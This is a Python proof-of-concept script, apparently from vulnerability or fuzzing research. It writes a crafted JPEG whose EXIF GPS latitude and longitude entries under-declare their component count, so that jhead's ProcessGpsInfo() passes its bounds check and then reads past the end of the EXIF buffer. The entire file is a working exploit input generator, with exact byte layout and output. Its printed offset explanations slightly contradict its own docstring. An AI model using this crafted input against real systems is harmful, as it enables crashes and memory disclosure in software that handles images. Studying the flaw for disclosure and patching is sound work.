#!/usr/bin/env python3
"""
VULN 001: GPS Lat/Long Out-of-Bounds Read via Under-counted Components
CWE-125: Out-of-bounds Read

ProcessGpsInfo() in gpsinfo.c iterates a=0,1,2 unconditionally for
TAG_GPS_LAT / TAG_GPS_LONG. The bounds check uses
  OffsetVal + Components*ComponentSize <= ExifLength
but the loop reads 3*ComponentSize bytes regardless of Components.

By setting Components=1 and placing GPS data at ExifLength-8
(last 8 bytes of EXIF segment), the bounds check passes
  (56 + 8 = 64 = ExifLength, NOT > ExifLength)
but the loop then reads at offsets +0, +8, +16 from ValuePtr,
reading 16 bytes past the end of the EXIF segment buffer.
"""

import struct
import os

OUTPUT_PATH = '/data/ylwang/non-textfuzz/target/_poc/jhead/._jpgfile_c/vuln_001_input.jpg'

# ---------------------------------------------------------------------------
# Build TIFF data (little-endian, total 64 bytes)
# Offsets are relative to the start of the TIFF header (= OffsetBase).
#
# Layout:
#   [0-7]   TIFF header ("II", 0x002A, IFD0_offset=8)
#   [8-25]  IFD0: 1 entry (TAG_GPSINFO pointer) + next-IFD=0
#   [26-55] GPS IFD: 2 entries (Lat, Long, each Components=1) + next-IFD=0
#   [56-63] GPS rational data: 8 bytes (1 URATIONAL, numerator=1, denom=1)
#
# ExifLength = 64
# GPS OffsetVal = 56  =>  56 + 8 = 64 = ExifLength  (passes bounds check)
# Loop reads offsets 0,8,16 from ValuePtr = reads 64-byte boundary at +8,+16
# ---------------------------------------------------------------------------

TIFF_SIZE    = 64
GPS_OFFSET   = 56          # ExifLength - ComponentSize = 64 - 8 = 56
GPS_IFD_OFF  = 26          # GPS IFD starts at byte 26

tiff = bytearray()

# --- TIFF header (8 bytes) ---
tiff += b'II'                           # Intel (little-endian) byte order
tiff += struct.pack('<H', 0x002A)       # TIFF magic
tiff += struct.pack('<I', 8)            # IFD0 starts at byte 8

# --- IFD0 (18 bytes: 2 + 12 + 4) ---
tiff += struct.pack('<H', 1)            # 1 directory entry

# IFD0 Entry: TAG_GPSINFO = 0x8825, Format=4 (LONG), Components=1, Value=GPS_IFD_OFF
tiff += struct.pack('<H', 0x8825)       # Tag
tiff += struct.pack('<H', 4)            # Format = LONG (4 bytes each)
tiff += struct.pack('<I', 1)            # Components = 1
tiff += struct.pack('<I', GPS_IFD_OFF)  # Inline value: offset to GPS IFD

tiff += struct.pack('<I', 0)            # IFD0 next-IFD pointer = 0

# Current offset: 8 + 18 = 26 = GPS_IFD_OFF  ✓

# --- GPS IFD (30 bytes: 2 + 12 + 12 + 4) ---
tiff += struct.pack('<H', 2)            # 2 directory entries

# GPS Lat entry: TAG=0x0002, Format=5 (URATIONAL=8 bytes), Components=1 (VULN!)
# ByteCount = 1*8 = 8. OffsetVal = 56. Check: 56+8=64=ExifLength → passes.
# Loop reads a=0,1,2: accesses +0, +8, +16 → OOB at +8 and +16.
tiff += struct.pack('<H', 0x0002)       # TAG_GPS_LAT
tiff += struct.pack('<H', 5)            # Format = URATIONAL (8 bytes/component)
tiff += struct.pack('<I', 1)            # Components = 1  <-- VULNERABILITY (should be 3)
tiff += struct.pack('<I', GPS_OFFSET)   # OffsetVal = 56

# GPS Long entry: TAG=0x0004, Format=5 (URATIONAL), Components=1 (VULN!)
tiff += struct.pack('<H', 0x0004)       # TAG_GPS_LONG
tiff += struct.pack('<H', 5)            # Format = URATIONAL
tiff += struct.pack('<I', 1)            # Components = 1  <-- VULNERABILITY
tiff += struct.pack('<I', GPS_OFFSET)   # OffsetVal = 56 (same 8 bytes)

tiff += struct.pack('<I', 0)            # GPS IFD next-IFD pointer = 0

# Current offset: 26 + 30 = 56 = GPS_OFFSET  ✓

# --- GPS rational data (8 bytes = 1 URATIONAL at ExifLength-8) ---
# Placed exactly at the end of the EXIF segment so that reading beyond
# it crosses the buffer boundary.
tiff += struct.pack('<I', 1)            # numerator   = 1
tiff += struct.pack('<I', 1)            # denominator = 1

# Sanity checks
assert len(tiff) == TIFF_SIZE, f"Expected TIFF size {TIFF_SIZE}, got {len(tiff)}"
assert GPS_OFFSET + 8 == TIFF_SIZE, "GPS data must end exactly at ExifLength"

# ---------------------------------------------------------------------------
# Wrap in APP1 / JPEG structure
# APP1 payload = "Exif\x00\x00" (6 bytes) + TIFF data (64 bytes) = 70 bytes
# APP1 length field = 70 + 2 (length field itself) = 72 = 0x0048
# ExifLength passed to process_EXIF = itemlen - 8 = 72 - 8 = 64 ✓
# ---------------------------------------------------------------------------

exif_prefix  = b'Exif\x00\x00'
app1_payload = exif_prefix + bytes(tiff)
app1_length  = 2 + len(app1_payload)   # includes the 2-byte length field itself

jpeg  = b'\xff\xd8'                       # SOI
jpeg += b'\xff\xe1'                       # APP1 marker
jpeg += struct.pack('>H', app1_length)   # APP1 length (big-endian)
jpeg += app1_payload

os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, 'wb') as f:
    f.write(jpeg)

print(f"Written {len(jpeg)} bytes to {OUTPUT_PATH}")
print(f"TIFF size = {TIFF_SIZE} bytes = ExifLength")
print(f"GPS OffsetVal = {GPS_OFFSET}, ByteCount = 8")
print(f"Bounds check: {GPS_OFFSET} + 8 = {GPS_OFFSET+8} == ExifLength => PASSES")
print(f"Loop a=1 reads at offset {GPS_OFFSET+8} => 1 byte past ExifLength => OOB READ")
print(f"Loop a=2 reads at offset {GPS_OFFSET+16} => 9 bytes past ExifLength => OOB READ")
